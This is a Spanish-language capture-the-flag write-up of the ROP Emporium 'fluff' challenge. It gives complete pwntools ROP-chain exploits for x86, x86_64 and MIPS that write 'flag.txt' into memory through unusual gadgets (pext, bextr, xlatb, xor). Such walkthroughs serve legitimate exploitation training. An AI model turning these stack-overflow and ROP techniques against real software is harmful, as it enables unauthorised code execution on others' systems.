# fluff

![2025-05-31-155232_808x308_scrot](https://github.com/user-attachments/assets/b21c28b9-2843-4129-b7d4-d66bd9cb58e3)

Mi hardware no soporta bmi1 (binary manipulation instructions) por lo que tuve que emular otra cpu con qemu para poder probar mis exploits.

## x86

En este reto debemos escribir en memoria de nuevo "flag.txt" y llamar a `print_file` pero esta vez contamos con gadgets mas complejos:
```
 r2 -A fluff32 2>/dev/null
[0x080483f0]> pd 20 @ sym.usefulFunction
/ 25: sym.usefulFunction ();
|           0x0804852a      55             push ebp
|           0x0804852b      89e5           mov ebp, esp
|           0x0804852d      83ec08         sub esp, 8
|           0x08048530      83ec0c         sub esp, 0xc
|           0x08048533      68e0850408     push str.nonexistent        ; 0x80485e0 ; "nonexistent"
|           0x08048538      e893feffff     call sym.imp.print_file
|           0x0804853d      83c410         add esp, 0x10
|           0x08048540      90             nop
|           0x08048541      c9             leave
\           0x08048542      c3             ret
            ;-- questionableGadgets:
            0x08048543      89e8           mov eax, ebp
            0x08048545      bbbababab0     mov ebx, 0xb0bababa
            0x0804854a      c4e262f5d0     pext edx, ebx, eax
            0x0804854f      b8efbeadde     mov eax, 0xdeadbeef
            0x08048554      c3             ret
            0x08048555      8611           xchg byte [ecx], dl
            0x08048557      c3             ret
            0x08048558      59             pop ecx
            0x08048559      0fc9           bswap ecx
            0x0804855b      c3             ret
```

Tenemos estos gadgets:
```
    gadget_write_1 = 0x08048543   # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret
    gadget_write_2 = 0x08048558   # pop ecx; bswap ecx; ret
    gadget_write_3 = 0x08048555   #  xchg byte [ecx], dl; ret
```

El primero usa `pext`, una instruccion que toma `ebx`, le aplica la mascara `eax` y almacena los bits extraidos en `edx` (comienza a escribir los bits extraidos por el LSB)

El segundo usa `bswap` que revierte el endianness de los bits; si es little-endian lo convierte a big-endian y viceversa.

El tercero usa `xchg` que intercambia los valores entre los dos registros o, en este caso, direccion de memoria y registro.

Referencia: https://www.felixcloutier.com/x86/

Para escribir en memoria "flag.txt" hacemos los siguiente:
1. Almacenamos cada byte de la cadena en `ebx` o mas bien en su parte baja: `dl`, usando el primer gadget
2. Almacenamos la direccion de `.data` en ecx usando el segundo gadget.
3. Escribimos el byte de la cadena en `dl` hacia `.data`.

### Paso 1
`pext` se comporta de la siguiente manera:

![2025-05-31-223936_583x227_scrot](https://github.com/user-attachments/assets/c0dfb75e-bfe0-4f92-92e7-86c5cc624851)

Debemos crear un algoritmo que dado el valor que tenemos de `ebx` nos pueda crear una mascara para obtener cada byte particular:
``` python
def find_mask(x):
    obj_bits = [1 if  x & (1 << (7-n)) else 0 for n in range(8)]
    obj_bits.reverse() # PEXT compacts from MSB to LSB

    ebx = 0xb0bababa
    mask_bits = []
    n = 0
    for i in range(ebx.bit_length()):
        if n >= len(obj_bits):
            break
        ebx_bit = (ebx >> i) & 1
        if obj_bits[n] == ebx_bit:
            mask_bits.append(1)
            n+=1
        else:
            mask_bits.append(0)
    
    mask_bits.reverse() # LSB-first to MSB-first
    mask = 0
    for bit in mask_bits:
           mask = (mask << 1) | bit
    return p32(mask)
```

### Paso 2
Empaquetamos `.data`+offset en big-endian: `p32(data_addr + i,endian="big")` para que al invertirse acabe en little-endian.

### Paso 3
Escribimos el valor almacenado en `dl` en `.data`+offset.

Exploit:
``` python
from pwn import *
import sys

data_addr = 0x0804a018
print_file_addr = 0x080483d0

# populate edx
gadget_write_0 = 0x080485bb    # pop ebp ; ret
gadget_write_1 = 0x08048543   # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret 
# populate ecx
gadget_write_2 = 0x08048558   # pop ecx; bswap ecx; ret
# write to memory
gadget_write_3 = 0x08048555   #  xchg byte [ecx], dl; ret

def find_mask(x):
    obj_bits = [1 if  x & (1 << (7-n)) else 0 for n in range(8)]
    obj_bits.reverse() # PEXT compacts from MSB to LSB

    ebx = 0xb0bababa
    mask_bits = []
    n = 0
    for i in range(ebx.bit_length()):
        if n >= len(obj_bits):
            break
        ebx_bit = (ebx >> i) & 1
        if obj_bits[n] == ebx_bit:
            mask_bits.append(1)
            n+=1
        else:
            mask_bits.append(0)
    
    mask_bits.reverse() # LSB-first to MSB-first
    mask = 0
    for bit in mask_bits:
           mask = (mask << 1) | bit
    return p32(mask)

def write_in_data(data):
    p = b""
    # Write "flag.txt"
    for i in range(len(data)):
        # Step 1
        p += p32(gadget_write_0)
        #p += p32(0) 
        p += find_mask(data[i]) # SIGILL ??? 
        p += p32(gadget_write_1)
        # Step 2
        p += p32(gadget_write_2)
        p += p32(data_addr + i,endian="big")
        # Step 3
        p += p32(gadget_write_3)
    return p

payload = b"A" * 44
payload += write_in_data(b"flag.txt")  # write "flag.txt" en .data
payload += p32(print_file_addr)        # print_file("flag.txt")
payload += p32(0)                      # ebp
payload += p32(data_addr)              # "flag.txt"

sys.stdout.buffer.write(payload)
```

```
qemu-i386 -cpu Haswell ./fluff32 <<< $(python3 s.py)
qemu-i386: warning: TCG doesn't support requested feature: CPUID.07H:EBX.hle [bit 4]
qemu-i386: warning: TCG doesn't support requested feature: CPUID.07H:EBX.rtm [bit 11]
fluff by ROP Emporium
x86

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
zsh: segmentation fault  qemu-i386 -cpu Haswell ./fluff32 <<< $(python3 s.py)
```

## x86_64

Mas o menos la misma historia, revisamos `usefulGadgets` y tenemos estos:
```
write_gadget_1 = 0x0040062a          # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
write_gadget_2 = 0x0000000000400628  # xlatb ; ret
write_gadget_3 = 0x0000000000400639  # stosb byte ptr [rdi], al ; ret
```

El primero usa `bextr`, una instruccion que almacena bits de rdx en rbx segun el contenido de rcx, en breve veremos eso.

El segundo usa `xlatb`, que toma el valor en la direccion [rbx+al] y lo almacena de vuelta en al. O sea que al es el indice tambien.

El tercero usa `stosb`, que practicamente hace lo mismo que mov.

Referencia: https://www.felixcloutier.com/x86/

La estrategia para escribir "flag.txt" en `.data` es la siguiente:
1. Almacenamos la direccion de un byte que contenga un caracter de 'flag.txt' en `rbx` con el primer gadget
2. Copiamos ese byte a `al` con el segundo gadget
3. Copiamos el byte a `.data` con el tercer gadget (para esto tambien necesitamos usar un gadget pop_rdi)

### Paso 1
Segun la documentacion en `rcx[0:7]` se almacena START o indice a partir de donde se comienzan a extraer bytes de `rdx` (LSB), y en `rcx[8:15]` se almacena LENGTH, que es la cantidad de bits que se van a extraer.

La instruccion `add rcx, 0x3ef2;` es una molestia pero se puede resolver con desplazamiento. Si almacenamos el byte en los 32 bits mas significativos y solo extraemos estos entonces resolvemos el problema.

Digamos: `$rdx=0x000000FF00000000` 

cuando se sume queda asi :`$rdx=0x000000FF000003ef2` 

Y extraemos [32:63], quedandonos con `0x000000FF`, nuestro byte.

### Paso 2
En `rbx` almacenamos la direccion del byte (read_addr): al, porque entonces cuando se ejecute `xlatb`: read_addr: al + al = read_addr.

Para encontrar el valor de al antes de la llamada al gadget debemos usar un debugger para detenernos antes de la llamada al gadget:
``` python
#!/bin/python3
from pwn import *

gadget = 0x00400628
payload = b'A' * 40 + p64(gadget)

# replace tmux with your terminal
context.terminal = ['tmux', 'splitw', '-hp', '70']

# break when ropchain starts
io = gdb.debug('./fluff', '''
               b *0x00400628
               c
               ''')
io.send(payload)
io.interactive()
```

```
pwndbg> info registers al
al             0xb                 11
```

Para encontrar los bytes que vamos a escribir en memoria podemos usar r2:
```
 r2 -A fluff 2>/dev/null
[0x00400520]> / f
0x004003c4 hit0_0 .libfluff.so__gmon_s.
0x004003c7 hit0_1 .libfluff.so__gmon_star.
0x004003c8 hit0_2 .libfluff.so__gmon_start.
0x004003e2 hit0_3 .n_start__print_filepwnme_init.
0x004003f4 hit0_4 .lepwnme_init_finilibc.so.6__.
0x00400552 hit0_5 .@ Df.@U8.
0x0040058a hit0_6 .]8`D]fD8`UH8.
0x004005ca hit0_7 .t]8`]fD=a uUH.
0x004005f6 hit0_8 . ]D@f.UH].
0x004006a6 hit0_9 .H[]A\A]A^A_f.H.
[0x00400520]> / l
0x00400239 hit1_0 ./lib64/ld-linux-x8.
0x0040023f hit1_1 ./lib64/ld-linux-x86-64.s.
0x00400242 hit1_2 ./lib64/ld-linux-x86-64.so.2.
0x004003c1 hit1_3 .@libfluff.so__gmo.
0x004003c5 hit1_4 .libfluff.so__gmon_st.
0x004003e4 hit1_5 .start__print_filepwnme_init_f.
0x004003f9 hit1_6 .nme_init_finilibc.so.6__libc_.
0x00400405 hit1_7 .inilibc.so.6__libc_start_main_.
[0x00400520]> / a
0x004003d6 hit2_0 .uff.so__gmon_start__print_file.
0x0040040c hit2_1 .c.so.6__libc_start_main_edata_.
0x00400411 hit2_2 .6__libc_start_main_edata__bss_.
0x00400418 hit2_3 .c_start_main_edata__bss_start_.
0x0040041a hit2_4 .start_main_edata__bss_start_en.
0x00400424 hit2_5 ._edata__bss_start_endGLIBC_2..
0x004005d2 hit2_6 .]fD=a uUH~.
```

Podemos usar la direccion que nos convenga.

## Paso 3

Escribimos el byte en `.data` + offset, actualizando al con el valor del ultimo byte en cada iteracion.

Exploit:
``` python
from pwn import *
import sys

data_addr = 0x00601028
pop_rdi = 0x00000000004006a3         # pop rdi ; ret
print_file_addr = 0x00400510

write_gadget_1 = 0x0040062a          # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
write_gadget_2 = 0x0000000000400628  # xlatb ; ret
write_gadget_3 = 0x0000000000400639  # stosb byte ptr [rdi], al ; ret

char_map = {'f': 0x0040058a, 'l': 0x004003e4, 'a': 0x00400424,
            'g': 0x004003cf, '.': 0x004003fd, 't': 0x004003e0,
            'x': 0x00400725}
target_str = "flag.txt"

def write_in_data(addrs):
    p = b""
    al = 11
    for i,char in enumerate(target_str):
        read_addr = char_map[char]
        # set rbx to read_addr
        # rdx[....|LENGTH|START]  to extract higher 32 bits
        rdx = p8(32) + p8(32) + p32(0) + p16(0)
        # rcx = 0xAAAAAAAA0000000 + 0x3ef2 = 0xAAAAAAAA00003ef2
        rcx = p32(0) + p32(read_addr - al)
        p += p64(write_gadget_1) + rdx + rcx
        # xlab does al = [rbx+al]
        p += p64(write_gadget_2)
        p += p64(pop_rdi) + p64(data_addr + i)
        p += p64(write_gadget_3)
        al = ord(char)
    return p

payload = b"A" * 40
payload += write_in_data(char_map)  
payload += p64(pop_rdi)
payload += p64(data_addr)           
payload += p64(print_file_addr)

sys.stdout.buffer.write(payload)
```

``` 
qemu-x86_64 -cpu Haswell ./fluff <<< $(python3 s64.py)
qemu-x86_64: warning: TCG doesn't support requested feature: CPUID.07H:EBX.hle [bit 4]
qemu-x86_64: warning: TCG doesn't support requested feature: CPUID.07H:EBX.rtm [bit 11]
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
zsh: segmentation fault  qemu-x86_64 -cpu Haswell ./fluff <<< $(python3 s64.py)  
```

## MIPS

En esta arquitectura no usaron gadgets raros, lo máximo que hacían estos gadgets cuestionables era usar XOR o llenar registros innecesarios:
```py
from pwn import *
#io = process("qemu-mipsel -g 1024 -L /usr/mipsel-linux-gnu fluff_mipsel",shell=True)
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu fluff_mipsel",shell=True)

"""
 0x0040099c      0400b98f       lw t9, 4(sp)
 0x004009a0      000011ae       sw s1, (s0)
 0x004009a4      09f82003       jalr t9
 0x004009a8      0800bd23       addi sp, sp, 8
"""
write_s1_s0_gadget = 0x0040099c

"""
 0x004009ac      0800a48f       lw a0, 8(sp)
 0x004009b0      0400b98f       lw t9, 4(sp)
 0x004009b4      09f82003       jalr t9
 0x004009b8      0c00bd23       addi sp, sp, 0xc
"""
load_a0_gadget = 0x004009ac

"""
 0x0040094c      0800b98f       lw t9, 8(sp)
 0x00400950      0400b28f       lw s2, 4(sp)
 0x00400954      41000c3c       lui t4, 0x41                ; 'A'
 0x00400958      742c8c35       ori t4, t4, 0x2c74
 0x0040095c      09f82003       jalr t9
 0x00400960      0c00bd23       addi sp, sp, 0xc
"""
load_s2_gadget = 0x0040094c

"""
 0x00400964      0400b98f       lw t9, 4(sp)
 0x00400968      26883202       xor s1, s1, s2
 0x0040096c      4100053c       lui a1, 0x41                ; 'A'
 0x00400970      0015a534       ori a1, a1, 0x1500
 0x00400974      09f82003       jalr t9
 0x00400978      0800bd23       addi sp, sp, 8
"""
xor_s1_s2_gadget = 0x00400964

"""
 0x00400930      0800b98f       lw t9, 8(sp)
 0x00400934      0400ac8f       lw t4, 4(sp)
 0x00400938      26883102       xor s1, s1, s1
 0x0040093c      4100043c       lui a0, 0x41                ; 'A'
 0x00400940      702c8434       ori a0, a0, 0x2c70
 0x00400944      09f82003       jalr t9
 0x00400948      0c00bd23       addi sp, sp, 0xc
"""
zero_s1_gadget = 0x00400930 

"""
 0x0040097c      0400b98f       lw t9, 4(sp)
 0x00400980      26801102       xor s0, s0, s1
 0x00400984      26881102       xor s1, s0, s1
 0x00400988      26801102       xor s0, s0, s1
 0x0040098c      41000d3c       lui t5, 0x41                ; 'A'
 0x00400990      0415ad35       ori t5, t5, 0x1504
 0x00400994      09f82003       jalr t9
"""
load_s0_gadget = 0x0040097c

def write(data, address):
    l = len(data)
    if l % 4 != 0:
        data.extend([b"\x00"] * (4 - (l % 4)))

    chain = b""
    for i in range(0,l,4):
        # $s1 = 0
        chain += p32(zero_s1_gadget)
        chain += p32(0)
        chain += p32(0)
        # $s2 = address
        chain += p32(load_s2_gadget)
        chain += p32(0)
        chain += p32(address + i)
        # $s1 = 0 ^ $s2 = $s2 = address
        chain += p32(xor_s1_s2_gadget)
        chain += p32(0)
        # $s0 = $s1 = address
        chain += p32(load_s0_gadget)
        chain += p32(0)
        # $s1 = 0
        chain += p32(zero_s1_gadget)
        chain += p32(0)
        chain += p32(0)
        # $s2 = data_chunk
        chain += p32(load_s2_gadget)
        chain += p32(0)
        chain += data[i:i+4]
        # $s1 = 0 ^ $s2 = $s2 = data chunk
        chain += p32(xor_s1_s2_gadget)
        chain += p32(0)
        # copy data chunk to address
        chain += p32(write_s1_s0_gadget)
        chain += p32(0)
    return chain

payload = b""
payload += b"A"*36
payload += write(b"flag.txt",0x00411068)
payload += p32(load_a0_gadget) + p32(0) + p32(0x00400af0) + p32(0x00411068)

io.send(payload)
io.interactive()
```

